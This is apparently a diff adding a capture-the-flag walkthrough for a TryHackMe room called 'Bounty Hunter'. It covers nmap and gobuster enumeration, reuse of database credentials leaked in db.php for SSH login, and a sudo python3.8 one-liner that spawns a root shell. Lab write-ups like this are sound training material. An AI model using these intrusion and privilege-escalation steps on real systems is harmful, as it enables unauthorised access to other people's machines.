@@ -1,0 +1,108 @@
+----------------                               ------------------
+               :::::::::::;| BOUNTY HUNTER |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "BOUNTY HUNTER".
+
+TASK - 1 (RECON)
+
+1. SCAN THE MACHINE.
+
+    nmap -Pn <IP>
+
+    nmap -A -T 5 <IP> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 2 ports (22/SSH, 80/HTTP).
+
+3. What's running on port 80?
+ANS: Apache web server.
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB ENUM)
+
+1. CHECK THE WEBSITE.
+
+    http://<IP>
+
+"there's a form and some weird text".
+
+2. VIEW PAGE SOURCE.
+
+    Right-click -> View Page Source
+
+"found a comment: <!-- /test.php -->".
+
+3. TEST THE TEST.PHP PAGE.
+
+    http://<IP>/test.php
+
+"shows some base64 encoded stuff".
+
+4. DECODE THE BASE64.
+
+    echo "encodedtext" | base64 -d
+
+"got a hint: 'look for /dir_6534'".
+
+5. FIND HIDDEN DIR.
+
+    gobuster dir -u http://<IP> -w /path/to/wordlist.txt
+
+"found /dir_6534 with db.php inside".
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (EXPLOIT)
+
+1. CHECK DB.PHP LEAK.
+
+    http://<IP>/dir_6534/db.php
+
+"shows MySQL creds: dev:password123".
+
+2. LOGIN TO SSH.
+
+    ssh dev@<IP> 
+    password: password123
+
+"SUCCESS! We're in as 'dev'".
+
+----------TASK 3 COMPLETED-----------
+
+TASK - 4 (PRIV ESC)
+
+1. CHECK SUDO RIGHTS.
+
+    sudo -l
+
+"WHY? 'sudo -l' shows what commands you can run as root.  
+     If you see '(ALL) NOPASSWD: /usr/bin/python3.8',  
+     THAT'S YOUR TICKET TO ROOT!"
+
+2. EXPLOIT PYTHON SUDO.
+
+    sudo /usr/bin/python3.8 -c 'import os; os.system("/bin/bash")'
+
+"BOOM! ROOT SHELL ACHIEVED."
+
+----------TASK 4 COMPLETED-----------
+
+TASK - 5 (FLAGS)
+
+1. FIND USER FLAG.
+
+    find / -name user.txt 2>/dev/null
+    cat /home/dev/user.txt
+
+2. FIND ROOT FLAG.
+
+    cat /root/root.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- BOUNTY HUNTER IS COMPLETED ----------
